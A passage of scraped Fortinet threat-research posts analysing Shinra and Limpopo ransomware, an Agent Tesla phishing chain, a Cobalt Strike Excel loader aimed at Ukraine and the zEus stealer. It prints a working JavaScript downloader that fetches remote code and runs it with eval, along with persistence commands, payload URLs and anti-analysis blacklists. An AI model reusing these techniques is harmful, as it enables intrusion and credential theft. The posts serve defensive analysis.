.msi .bmp .iso .shinra2 The ransomware does not encrypt files in directories containing the following strings: $Windows.~bt intel msocache $recycle.bin Windows photo viewer Windows nt msbuild internet explorer System volume information Windows.old google application data Windows defender Windows perflog Windows security Windowspowershell microsoft boot Windows journal microsoft shared common files appdata usoshared $Windows.~ws all users Windowsapp microsoft.net It avoids encrypting the following files: ntldr ntuser.dat bootsect.bak autorun.inf thumbs.db iconcache.db Oddly enough, the Shinra ransomware also includes a different list of file extensions, but we could not find any code using this list. It’s possible that the list is for future development or leftover code that wasn’t removed. The list contains the following extensions: .rar .zip .ckp .db3 .dbf .dbc .dbs .dbt .dbv .frm .mdf .mrg .mwb .myd .ndf .qry .sdb .sdf .sql .tmd .wdb .bz2 .tgz .lzo .db .7z .sqlite .accdb sqlite3 .sqlitedb .db-wal .db-shm .dacpac .1c .1cd .vmdk .vmem .iso .tar .fdb .csv .mdb .sl2 .mpd .rsd .tdb .tib The Shinra ransomware uses COM to run the following commands to delete shadow copies, making file recovery difficult: It then appends “.[ethan@[removed].info].SHINRA2” to the infected files. Other Shinra ransomware variants add different file extensions, such as \".SHINRA3,\" \".SHINRA7,\" and \".SHINRA9\" instead of \".SHINRA2.\" Also, some of the samples change the file icon of the encrypted files, as seen in this screenshot: The ransomware executes the following command to change the \"boot status policy\" settings so that Windows starts normally regardless of any boot errors: It also executes the following command, which disables the recovery and repair functions of Windows: The ransomware then restarts itself using \"runas admin\" to ensure that it is running with administrator privileges. The malware also checks to make sure it’s running inside a targeted operating system by: The ransomware silently empties the Recycle Bin without user confirmation, progress bar, or sound. Finally, it drops a ransom note, which demands victims to contact the attacker via email: In March of this year, FortiGuard Labs received an inquiry from an Asian law enforcement agency about ransomware named “Socotra” due to its impact in that region. While no sample of the Socorta ransomware has surfaced to date, we were able to trace it back to another ransomware, Limpopo, which was submitted to a publicly available file scanning service in February 2024 that targets ESXi environments. Information on the infection vector used by the Limpopo ransomware threat actor is unavailable. Given thatBushidoToken's tweetreported that this malware is affecting Latin America and Thailand, in addition to the previous inquiry about Socorta ransomware from Asia, it is not hard to imagine that they are spreading the ransomware widely in some way, such as through Trojanized software or by exploiting vulnerabilities. Based on the locations from which ransom notes likely used by the Limpopo ransomware family were submitted to the publicly available scanning service, the countries of Chile, Guatemala, Honduras, India, Italy, Mexico, Peru, Spain, Thailand, the United States, and Vietnam were potentially affected. The Limpopo ransomware is not complex. Once executed, the Limpopo ransomware encrypts files with the following extensions: .log .vmdk .vmsd .vmem .vswp .vmx2 .vmxf .vmss .vmtx .vmtm .nvram .vsb .vbm .vlb .vrb .hlog .rar .vsm .vsm .vbk .zip .iso .tgz .bco .dump .gzip .bck .bkp .tmp .vmx .ova .ovf .tar .vmd .vmsn Once files have been encrypted, a “.LIMPOPO” extension is added to the filename. Files with this extension are skipped and effectively whitelisted. It then drops the following ransom note: Hi. We have your data. If you don't cooperate it will be made public. Go to hxxps://getsession[.]org/ Downloadinstall then add [removed] mention this code LIMPOPO in your messageget in touch with us No other samples of the Limpopo ransomware were found, but we found similar ransom notes that may have been used by ransomware variants. For example, the Socorta ransomware, a potential Limpopo variant, drops the following ransom note: Go to hxxps://getsession[.]org/ Downloadinstall then add [Removed] to your contacts and send a message with this codename -- SOCOTRA Although no actual malware samples are available, other possible Limpopo ransomware variants include Akgum, Aktakyr, Bulanyk, Formosa, Hatartam, Monjukly, Sakgar, Sazanda, and Windows ransomware. While unverified, thetweetbelow claims that the Socotra ransomware exploits CVE-2024-22252 and CVE-2024-22253 (CVE-20204-22252 and CVE-20204-22253 may be a typo) that affect VMware ESXi, Workstation, and Fusion, which were patched in March 2024. English translation: In the case of cve 20204-22252, cve-20204-22253, be sure to patch it because it will destroy your Eid holiday. The Shinra and Limpopo ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of those solutions. As a result, customers with up-to-date versions of these products installed are protected. Shinra Ransomware File IOCs SHA2 Note 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7 Shinra ransomware d60d4624425b2f58dd9e37c40046f776e0d78cb031488a12c435239dd0da40ef 941a95c85a4b37bff4571d49eb918a5094a032ac1416bded3a3cd3427ecf984c 399d586f033ec625a1f7524c86a1483808ff07e920f93e82e70cc5138feee72e Limpopo Ransomware File IOCs SHA2 Note 031971b9ccb57c1a7cf25bbd58533a6b1b1e760b2f080cb2be5e2522c0d90053 Limpopo ransomware 58ba94be5c2c7d740b6192fea1cc829756da955bb0f2fcf478ab8355bf33a31a Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts that provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-shinra-and-limpopo-ransomware"
  },
  {
    "title": "New Agent Tesla Campaign Targeting Spanish-Speaking People",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity Level:Critical A new phishing campaign was recently captured by our FortiGuard Labs that spreads a new Agent Tesla variant targeting Spanish-speaking people. Security researchers have detected Agent Tesla campaigns from time to time for years. Agent Tesla is a well-known .Net-based Remote Access Trojan (RAT) designed to stealthily infiltrate victim’s computers and steal their sensitive information, such as their computer’s hardware information, login user information, keystrokes, email contacts, web browser cookies files, system clipboard data, screenshots, and basic information like login user name, computer name, OS information, CPU and RAM information, as well as saved credentials in widely installed software. In-depth research on this campaign shows that it also leverages multiple techniques to deliver the Agent Tesla core module, such as using known MS Office vulnerabilities, JavaScript code, PowerShell code, fileless modules, and more, to protect itself from being analyzed by security researchers. In this analysis, I will elaborate on how the campaign works to load Agent Tesla onto a victim’s computer, how it starts, what sensitive data it is able to collect, and the way it sends stolen data to the attacker. As you can see from the above screenshot, the phishing email was written in Spanish. The message translated into English reads as: Good day Attached is proof of payment made to your account according to your client's instructions. The phishing email looks like a standard SWIFT transfer notification from a large financial institution with a disguised Excel attachment (transferencia_swift_87647574684.xla) to the victim, as shown in Figure 1. As you may have noticed, the FortiClient service marked the phishing email with “[virus detected]” to warn the user about the attached Excel document. The Excel document is in OLE format with crafted embedded data that exploits theCVE-2017-0199vulnerability. It contains an embedded OLE hyperlink, which is opened automatically once the Excel document is started by the victim. The provided hyperlink in the document is “hxxp[:]//ilang[.]in/QqBbmc”, as shown in Figure 2. Once the victim opens the Excel file, it automatically downloads an RTF document, which the Word program then calls to open. Figure 3 shows the traffic and how the URL downloads the RTF document. CVE-2017-11882is an RCE (Remote Code Execution) vulnerability in Microsoft Office’s Equation Editor component (EQNED32.EXE). It can be exploited by Excel, Word, PowerPoint, and RTF documents as long as they contain crafted equation data in an OLE object. Successfully exploiting this vulnerability allows an attacker to execute arbitrary code on a victim's computer. This buffer overflow vulnerability overrides a return address in the stack of EQNED32.EXE. It can then hijack the process to jump to and execute the malicious code copied in the stack. Figure 4 shows the crafted equation data extracted from the downloaded RTF document. The data marked in red is a constant address of EQNED32.EXE that will override a return address in the stack when a buffer overflow occurs. Once the shellcode is executed, it downloads a JavaScript code from a website and executes it on the victim’s computer. In Figure 5, the shellcode was about to call an API, URLDownloadToFileW(), to download the JavaScript file from “hxxp[:]//equalizerrr[.]duckdns.org/eveningdatingforeveryone.js” to the local file “C:\\Users\\Bobs\\AppData\\Roaming\\morningdatingroses.js.” It then calls the API ShellExecuteW() to execute the JavaScript file (the Windows program WScript.exe is called to execute the JS file). Finally, it exits the process by calling the API ExitProcess(). Below is a code snippet of the JavaScript file. It is very clear that it continues to download another file from “hxxps[:]//paste[.]ee/d/yWWXG.” This JavaScript file is executed after calling the eval() function. morningdatingroses.js: var paparicos = new ActiveXObject(\"MSXML2.XMLHTTP\");var alijar = \"GXWWy/d/ee.etsap//:sptth\".split(\"\").reverse().join(\"\");paparicos.open(\"GET\", alijar, false);paparicos.send(); var vomitar = \"\";if (paparicos.status === 200) {vomitar= paparicos.responseText;} function estarostia(piguancha) {eval(piguancha);} estarostia(vomitar); When opening the URL in a web browser, it looks like normal JavaScript code, but it contains a piece of malicious code with base64-encoded PowerShell code. This code will be decoded and combined with other code (shown below) and executed inside a “powershell.exe” process, as you can see in Figure 6. The PowerShell code’s purpose includes: Please refer to Figure 7 for more information about the PowerShell code. The loader-module is a kind of fileless module that is never saved in the local folder. This makes it difficult for a researcher to notice the file unless performing a step-by-step, in-depth analysis. The first argument to the method VAI() is a reversed URL to the Agent Tesla core module, which is “hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt.” The second argument is a switch. If it’s “1,” it will establish persistence on the victim’s computer by adding itself to the auto-run group in the system’s registry. In this case, it’s \"desativado,” so it won’t establish. The penultimate argument is a process name, which for this variant is “AddInProcess32.” The loader-module running in a PowerShell process downloads a file from the URL passed by the first argument and keeps it in the memory. This is the Agent Tesla core module, as shown in Figure 8. Afterward, it initiates the 'AddInProcess32' process in a suspended state by calling the API CreateProcessA() with the creation flags of 0x80000004 (CREATE_SUSPENDED). Next, the loader-module performs process hollowing on the process that it copies the Agent Tesla executable into and executes it within the “AddInProcess32.exe” process. To do this, it calls APIs, such as GetThreadContext(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). Figure 9 shows the process tree outlining the complete picture, starting from the Excel document and ending with Agent Tesla running inside “AddInProcess32.exe.” This variant of Agent Tesla is a 32-bit .Net framework program is being obfuscated as a fileless module. Figure 10 shows a debugger that breaks Agent Tesla at the EntryPoint method, where the namespaces, classes, methods, and code flow are all obfuscated. A special method aims to detect whether it is running in an analysis environment. It performs the following detections: Once any of the above detections’ results are ‘true,’ it exits the process. In this section, I will review Agent Tesla’s features, such as how this variant collects credentials and email contacts from the victim’s device, the software from which it collects the data, and the basic information of the victim’s device. It steals saved credentials from some web browsers, classified as Chromium-based and Mozilla-based, because they use the same folder structure and files to save the credentials. It reads saved credentials from “Login Data” files under their browsers’ profile folder for Chromium-based browsers. Figure 11 shows that it had just obtained some “Opera Browser” (Chromium-based browser) credentials from its profile files “{browser’s profile path}\\Default\\Login Data” and “{browser’s profile path}\\Login Data.” Figure 12 shows it has just obtained credentials from a Firefox browser’s profile. This variant will steal credentials from the following web browser list. Chromium-based Web Browsers \"Orbitum,\" \"Elements Browser,\" \"Cool Novo,\" \"Sputnik,\" \"360 Browser,\" \"Uran,\" \"Iridium Browser,\" \"Liebao Browser,\" \"Vivaldi,\" \"Chromium,\" \"Sleipnir 6,\" \"Coowon,\" \"Coccoc,\" \"Amigo,\" \"Chedot,\" \"Epic Privacy,\" \"CentBrowser,\" \"Edge Chromium,\" \"Chrome,\" \"Citrio,\" \"Opera Browser,\" \"QIP Surf,\" \"Brave,\" \"Kometa,\" \"Comodo Dragon,\" \"7Star,\" \"Torch Browser,\" \"Yandex Browser.\" Mozilla-based Web Browsers \"Firefox, \"CyberFox, \"WaterFox, \"K-Meleon, \"Postbox, \"Thunderbird browser, \"IceCat, \"Flock, \"IceDragon, \"BlackHawk, \"PaleMoon,\" and \"SeaMonkey.” Other than the above web browsers, Agent Tesla continues to look for more saved credentials from a wide range of software, which I have categorized below. Other Web Browsers: \"Falkon Browser,\" \"Flock Browser,\" \"IE/Edge,\" \"QQ Browser,\" \"Safari for Windows,\" and \"UC Browser.” Email clients: \"Outlook, \"Opera Mail, \"PocoMail, \"The Bat!\", \"Becky!\", \"ClawsMail, \"FoxMail, \"IncrediMail, \"eM Client, \"Mailbird, \"Eudora,\" and \"Windows Mail App.\" FTP clients: \"CoreFTP,\" \"Flash FXP,\" \"FTPGetter,\" \"FTP Navigator,\"  \"FileZilla,\" \"SmartFTP,\" \"FtpCommander,\" \"WinSCP,\" and \"WS_FTP.\" VPN clients: \"NordVPN,\" \"TightVNC,\" \"RealVNC,\" \"UltraVNC,\" \"OpenVPN,\" and \"Private Internet Access.\" IM client: \"Discord,\" \"Pidgin,\" \"Trillian,\" \"Psi/Psi+,\" and \"Paltalk.\" Others: \"MysqlWorkbench,\" \"DynDns,\" \"Microsoft Credentials,\" \"Internet Downloader Manager,\" and \"JDownloader.” Agent Tesla can also collect the victim’s email contacts if they use Thunderbird as their email client. Inside global-messages-db.sqlite, under the Thunderbird profile folder, there is a file named global-messages-db.sqlite. It is an SQLite database that stores an index of all messages, including attachments, BCC and CC emails, folder names, and more. Agent Tesla extracts all contacts (email addresses) from such files. Based on my analysis, this variant disabled some features (some switch variables are set to “false” by default.), such as the keylogger, the screen logger, the system clipboard logger, and cookies. Refer to Figure 14 for details. Agent Tesla also collects information about the victim’s computer, such as the system date and time, login user name, computer name, public IP address, OS full name, CPU information, and RAM capacity. In the past, we captured many Agent Tesla variants that used HTTP POST and SMTP to submit their stolen data to their C2 server. This variant uses a new way to submit the data it collects from the victim’s device over the FTP protocol. The FTP server address and its credentials are plaintext strings held in some global variables. Figure 15 is a screenshot of Agent Tesla about to submit s credentials stolen from my test machine using the FTP method “STOR.” The format of the file name on the FTP is in “PW_{User name-Computer name_System Data&Time}.html”; the content is the stolen data in HTML format. The collected email contacts are in a txt file named “Contacts_Thunderbird.txt_{User name-Computer name_System Data&Time}.txt”. One example on my test machine is “Contacts_Thunderbird.txt_Bobs-BOBS-PC_2024_05_17_17_34_21.txt”. The txt file contains all the email addresses collected from Thunderbird. In this analysis, I went through the entire process of the Agent Tesla campaign targeting Spanish-speaking people. The flowchart in Figure 16 outlines this complex malicious campaign, detailing the process from the phishing email to the stolen information being submitted to an FTP server. We also examined how it uses multiple techniques to escape researcher analysis, such as exploiting two Microsoft vulnerabilities carried by Excel, RTF documents, executing JavaScript and PowerShell scripts, and encoding most downloaded files in base64. Next, we looked at how the fileless loader-module is called to download the Agent Tesla executable and run it in a process-hollowed AddInProcess.exe process. I then elaborated on how Agent Tesla detects whether it’s running in an analysis environment, like sandboxes, virtual machines, etc., or where there is AV software running, like Avast, Comodo, etc. We then looked at the functions this variant can perform on the victim’s device. It collects saved credentials from over 80 popular software applications and victim email contacts from Thunderbird profile files. Finally, you learned how this Agent Tesla variant submits the sensitive data it has harvested from the victim’s device to an FTP server using the “STOR” method. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the attached Excel document, the downloaded RTF document, and the Agent Tesla executable file with the following AV signatures. MSExcel/CVE_2017_0199.DDOC!exploit MSOffice/CVE_2017_11882.B!exploit MSIL/AgentTesla.B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document. You can also view FortiGuard Labs' previously released outbreak alert on Agent Teslahere. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps[:]//ilang[.]in/QqBbmc hxxp[:]//equalizerrr[.]duckdns[.]org/eveningdatingforeveryone.js hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt hxxps[:]//paste[.]ee/d/yWWXG hxxps[:]//uploaddeimagens[.]com[.]br/images/004/773/812/original/js.jpg?1713882778 ftp[.]fosna.net [transferencia_swift_87647574684.xla] 8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7 [RTF document] 208AF8E2754A3E55A64796B29EF3A625D89A357C59C43D0FF4D2D30E20092D74 [The loader-module] 7230CC614270DCA79415B0CF53A666A219BEB4BEED90C85A1AC09F082AEA613B [Agent Tesla Executable] A1475A0042FE86E50531BB8B8182F9E27A3A61F204700F42FD26406C3BDEC862 spanish,Agent Tesla FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-agent-tesla-campaign-targeting-spanish-speaking-people"
  },
  {
    "title": "Menace Unleashed: Excel File Deploys Cobalt Strike at Ukraine",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:High FortiGuard Labs has recently identified a sophisticated cyberattack involving an Excel file embedded with a VBA macro designed to deploy a DLL file. The attacker uses a multi-stage malware strategy to deliver the notorious \"Cobalt Strike\" payload and establish communication with a command and control (C2) server. This attack employs various evasion techniques to ensure successful payload delivery.Over the past few years, Ukraine has been a significant target due to its geopolitical situation. The history of these attacks reveals a pattern of increasing complexity and frequency, particularly during periods of geopolitical tension. For instance, in 2022,FortiGuard Labsreported a campaign using a malicious Excel document themed around the Ukrainian military to deliver a multi-stage Cobalt Strike loader. In 2023,Ukraine’s Computer Emergency Response Team (CERT-UA)disclosed that UAC-0057 was involved in an attack using a malicious XLS file containing a macro and a lure image to deploy PicassoLoader and Cobalt Strike Beacon on compromised systems. In this article, we will explore the technical details of this latest multi-stage attack. The malicious Excel document contains elements in Ukrainian designed to lure the user into enabling its macros. Once the VBA macro is enabled, the document switches to sheets related to the calculation of the “amount of budget funds allocated to military units” (translated from “обсягу бюджетних коштів, що спрямовуються до військових частин”). The primary function of the VBA macro is to deploy a DLL downloader, which is encoded in HEX. Additionally, most of the strings in the VBA code are HEX-encoded to evade basic string detection mechanisms. After dropping the DLL file “Ac83faafb23919Ae9.DLl” into “%APPDATA%\\VIBErpc\\bIn\\biN,” the macro creates a shortcut named “ACtIVePRObE” in “%APPDATA%\\Microsoft.” It then uses the “Shell” command to execute “RunDLL32.EXE shell32.dll,ShellExec_RunDLL '%APPDATA%\\Microsoft\\ACtIVePRObE.lnk', 0.” This LNK file is designed to calls regsvr32 to execute the DLL file “Ac83faafb23919Ae9.DLl.” The downloader “Ac83faafb23919Ae9.DLl.” is obfuscated with ConfuserEx. First, it examines process names for specific strings: “processhacker,” “avastui,” “aswtoolssvc,” “wsc_proxy,” “procexp,” “overseer,” and “avastsvc.” If it detects a matching process associated with an analysis tool or antivirus software, it terminates the program. Once passing the process checking, it constructs a web request to get the next stage payload from the URL “hxxps://goudieelectric[.]shop/cms/svg/6364.2809640e[.]chunk.svg.” It can only download the required file if the device is located in Ukraine. It then extracts the base64 encoded data in the section that starts with “href=” and XOR it with the hard-coded array. It then generates a random file name and saves the decoded data to the TEMP folder. It then executes the decoded file using “rundll32.exe,” followed by a sleep command to wait for the execution to finish. Once completed, it deletes the decoded file to remove any traces. The decoded data is also a .NET DLL file tasked with decrypting the file for the next stage and establishing persistence. Next, it checks if the targeted file exists. If not, it creates the file “C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll.” It then uses the hard-coded key to decrypt the data using an RC4 algorithm and writes the data to the newly created file. It then adds the registry value “C:\\Windows\\System32\\regsvr32.exe /s C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll” into “SOFTWARE\\Microsoft\\Widows\\CurrentVersion\\Run” for persistence and uses InvokeMethod with “Create” to execute the command in the registry. The file “ResetEngine.dll” serves as the core component for decrypting and injecting the final payload. It uses “NtDelayExecution” to evade the detection of malicious activities within sandboxes. It then iterates to inspect processes and attempts to terminate the parent process, if any, in order to implement its anti-debugging measures. After the evade detection process is complete, it decrypts the final payload with an AES algorithm. After decryption, it injects the decrypted data into itself and employs various APIs, including “GetCurrentProcessId,” “OpenProcess,” “VirtualAllocEx,” “WriteProcessMemory,” “CreateRemoteThread,” and “WaitForSingleObject” to execute the final Cobalt Strike. The configuration extraction process involves XOR-ing with 0x2E, allowing us to decipher the information hidden within. By extracting and parsing the configuration, we unveiled the Beacon’s Cobalt Strike Team Server’s (C2) URLs: “hxxps://simonandschuster[.]shop/the-zero-residual-concept/products” and “hxxps://simonandschuster[.]shop/the-zero-residual-concept/sjj-solutions.” In this sophisticated attack, the assailant employs multi-stage malware tactics to thwart detection while ensuring operational stability. By implementing location-based checks during payload downloads, the attacker aims to mask suspicious activity, potentially eluding scrutiny by analysts. Leveraging encoded strings, the VBA conceals crucial import strings, facilitating the deployment of DLL files for persistence and decrypting subsequent payloads. Furthermore, the self-deletion feature aids evasion tactics, while the DLL injector employs delaying tactics and terminates parent processes to evade sandboxing and anti-debugging mechanisms, respectively. These orchestrated maneuvers converge towards the deployment of Cobalt Strike onto targeted endpoints, particularly within the confines of Ukraine's geopolitical landscape. As Office documents provide troves of functionality, including numerous plugins and scripts, users must exercise utmost caution when handling files sourced from dubious origins. Vigilance is paramount, particularly regarding any suspicious file drops or unfamiliar startup programs within registry settings. The malware described in this report is detected and blocked byFortiGuard Antivirusas: VBA/Agent.APO!trW32/Injector.S!trMSIL/Agent.QTS!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. Domains goudieelectric[.]shop simonandschuster[.]shop Files 88c97af92688d03601e4687b290d4d7f9f29492612e29f714f26a9278c6eda5b 815c1571356cf328a18e0b1f3779d52e5ba11e5e4aac2d216b79bb387963c2be 9649d58a220ed2b4474a37d6eac5f055e696769f87baf58b1d3d0b5da69cbce5 af8104e567c6d614547acb36322ad2ed6469537cd1d78ae1be65fbde1d578abc de1bceb00c23e468f4f49a79ec69ec8ad3ed622a3ffc08f84c0481ad0f6f592b 6f4642a203541426d504608eed7927718207f29be2922a4c9aa7e022f22e0deb d90f6e12a917ba42f7604362fafc4e74ed3ce3ffca41ed5d3456de28b2d144bf d9b16f077cd6e00137ba208031d22fd6423d0ef303883ad4b6f78638693f2044 excel,ukraine,Cobalt Strike FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine"
  },
  {
    "title": "zEus Stealer Distributed via Crafted Minecraft Source Pack",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Many game makers allow users to alter a game's appearance or behavior to increase its enjoyment and replay value. Players can often also download packages created by others. However, this is also a chance for attackers to distribute their malware. This article examines a batch stealer distributed via a crafted Minecraft source pack. The zEus stealer malware has been added to a source pack that was being shared on YouTube. The name—zEus—is from a previous variant of this malware. The variant (d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a) is also distributed via a Minecraft source pack, but it’s embedded in a WinRAR self-extract file. The self-extract file mimics a Windows screensaver file. It runs the stealer and opens the image used as a file icon. It’s an image from the Internet with the string “zEus” added. This name is also found in a profile of the Discord webhook receiving stolen data. When a victim executes the zEus stealer, it checks whether it is being analyzed. If not, it collects sensitive information and drops script files to make the attack more flexible. The zEus stealer creates folders in C:\\ProgramData to save stolen data and malicious script files. zEus checks whether it is being analyzed by comparing the computer name and currently running processes with blacklists. Computer name blacklist: WDAGUtilityAccount, Abby, Peter, Wilson, hmarc, patex, JOHN-PC, RDhJ0CNFevzX, kEecfMwgj, Frank, 8Nl0ColNQ5bq, Lisa, John, george, PxmdUOpVyx, 8VizSM, w0fjuOVmCcP5A, lmVwjj9b, PqONjHVwexsS, 3u2v9m8, Julia, HEUeRzl, BEE7370C-8C0C-4, DESKTOP-NAKFFMT, WIN-5E07COS9ALR, B30F0242-1C6A-4, DESKTOP-VRSQLAG, Q9IATRKPRH, XC64ZB, DESKTOP-D019GDM, DESKTOP-WI8CLET, SERVER1, LISA-PC, JOHN-PC, DESKTOP-B0T93D6, DESKTOP-1PYKP29, DESKTOP-1Y2433R, WILEYPC, WORK, 6C4E733F-C2D9-4, RALPHS-PC, DESKTOP-WG3MYJS, DESKTOP-7XC6GEZ, DESKTOP-5OV9S0O, QarZhrdBpj, ORELEEPC, ARCHIBALDPC, JULIA-PC, d1bnJkfVlH, QDAVNJRH Program blacklist: httpdebuggerui, wireshark, fiddler, vboxservice, df5serv, processhacker, vboxtray, vmtoolsd, vmwaretray, ida64, ollydbg, pestudio, vmwareuser, vgauthservice, vmacthlp, x96dbg, vmsrvc, x32dbg, vmusrvc, prl_cc, prl_tools, xenservice, qemu-ga, joeboxcontrol, ksdumperclient, ksdumper, joeboxserver The zEus stealer grabs a wide range of information. It creates individual text files for each piece of information and saves them to corresponding folders. The folders for stolen information are in C: \\ProgramData\\STEALER, including the PCINFO, IPINFO, HARDWARE, BROWSERS, STEAL, LDB, and SESSION folders. This folder contains two folders: IPINFO and HARDWARE. zEus looks up the victim’s IP address and related details using the online tools My External IP, ipapi, and ip-api. The results are saved as text files in the IPINFO folder. Using the IP address, zEus queries for further information from the tools, including the internet service provider, location details such as city, longitude, and latitude, and postal code. In addition, it collects the status of whether the victim is using a proxy server and if a mobile network is being used. Next, zEus uses command-line utilities and PowerShell to collect hardware information and saves the results in the HARDWARE folder, including currently running processes, OS version, product key, hardware ID, system configuration, installed programs, and WIFI password. zEus copies files for login data and user preferences from the browsers’ profile path and stores them in corresponding folders. Below are the target browsers: Chrome, Opera, Brave, Vivaldi, Edge, Firefox From these browsers, it grabs files for login data and an encryption key for a password (if necessary). It then steals cookies, history, shortcuts, and bookmarks. This folder contains login data copied from the following software: Steam, osu!, Roblox, Growtopia, Discord The files are mostly copied from the software’s data path. In addition, zEus also searches for discord_backup_codes.txt in the Downloads folder. Discord_backup_codes.txt contains backup code that helps users log in when they lose their devices for multi-factor authentication (MFA). As a result, the zEus stealer tries to get the backup code from a default location for downloaded files. The LDB folder only stores .ldb files copied from %appdata%\\discord\\Local Storage\\leveldb. From these .ldb files, the attacker can extract Discord tokens containing account and password information and then log into the victim’s account. zEus also copies various data from the following path to the SESSION folder. Not only do these files contain credentials, but the attacker also collects information about the victim. For example, it copies the Logs folders from the parent folder of EpicGamesLauncher, which contains debug logs about EpicGamesLauncher. Additionally, it copies the parent folders of game companies like Battle.net and Electronic Art. With this knowledge, the attacker can know which games are popular with the victim and how to disguise the malware to achieve the next attack. Software Path Battle.net %appdata%\\Battle.netExclude strings: BrowserCache, Cache Electronic Arts %localappdata%\\Electronic Arts Epic Games 